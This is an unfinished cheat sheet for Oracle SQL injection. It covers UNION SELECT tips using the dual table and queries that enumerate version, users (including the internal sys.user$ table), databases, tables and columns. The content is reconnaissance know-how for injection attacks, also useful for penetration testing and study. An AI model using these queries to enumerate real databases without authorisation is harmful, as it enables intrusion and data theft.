# Oracle SQL Injection

### Tips
- On Oracle databases, the **SELECT** statement must have a **FROM** clause. If your **UNION SELECT** attack does not query from a table, you will still need to include the **FROM** keyword followed by a valid table name.
- There is a built-in table on Oracle called ***dual*** which you can use for this purpose.
  - example : `SELECT SYS.DATABASE_NAME FROM dual --`
- The ***dual*** table which is a special table used for evaluating expressions or calling functions.
- Oracle provides you with the ***dual*** table which is a special table that belongs to the schema of the user **SYS** but it is accessible to all users.
- The ***dual*** table has one column named **DUMMY** whose data type is `VARCHAR2()` and contains one row with a value **X**.


**get the version**
```
SELECT banner FROM v$version
SELECT version FROM v$instance
```

**get the user**
```
SELECT user FROM dual
SELECT NAME FROM sys.user$

[Note : Internal table sys.user$ keeps both users and roles.]
SELECT NAME, type#, ctime, ptime, exptime, ltime, lcount FROM sys.user$ WHERE NAME IN ('SYS', 'SYSTEM', 'PUBLIC', 'DBA', 'SCOTT') ORDER BY NAME;

(NAME – name for user or role
 TYPE# – 0 for role or 1 for user
 CTIME – the date of creation
 PTIME – the date the password was last changed
 EXPTIME – the date the password has last expired
 LTIME – the date the resource was last locked
 LCOUNT – number of failed logon)

[List all users that are visible to the current user]
SELECT * FROM all_users

[List all users in the Oracle Database]
SELECT * FROM dba_users

[Show the information of the current user]
SELECT * FROM user_users
```

**get the database**
```
select * from global_name
select name from v$database
select ora_database_name from dual
select SYS.DATABASE_NAME from dual
select db_name from v$instance
select instance_name from v$instance
select DISTINCT owner from all_tables
```

**get the table**
```
select table_name from all_tables

[Show tables owned by the current user]
SELECT table_name FROM user_tables ORDER BY table_name

[Show tables that are accessible by the current user]
SELECT table_name FROM all_tables ORDER BY table_name

[Show all tables of a specific owner]
SELECT * FROM all_tables WHERE OWNER = 'OWNER_NAME' ORDER BY table_name

[Show all tables in the Oracle Database]
SELECT table_name FROM dba_tables
```

**get the column**
```
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE_NAME'
(ALL_TAB_COLUMNS describes the columns of the tables, views, and clusters accessible to the current user.)

SELECT * FROM dba_tab_columns WHERE table_name = 'TABLE_NAME'
(DBA_TAB_COLUMNS describes the columns of all tables, views, and clusters in the database.)

SELECT * FROM user_tab_columns WHERE table_name = 'TABLE_NAME'
(USER_TAB_COLUMNS describes the columns of the tables, views, and clusters owned by the current user.)
```

**Note:** not completed. to be continued...
